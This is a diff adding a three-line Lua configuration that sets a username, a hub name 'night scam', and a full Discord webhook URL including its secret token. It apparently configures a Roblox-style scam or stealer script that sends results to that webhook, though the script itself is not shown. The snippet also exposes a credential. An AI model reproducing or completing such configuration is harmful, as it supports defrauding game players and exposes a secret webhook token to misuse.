@@ -1,0 +1,7 @@
+Lua
+
+_G.Username = "danwasley_gamer"
+
+_G.HubName = "night scam"
+
+_G.WebhookUrl = "https://discord.com/api/webhooks/1098348998215090316/1gWBRGZp0FHh4-2AgFUQ7in2ZctuMWekdGfA01MUFKCvfzakkglYa2sRjNszRsjHjhwJ"
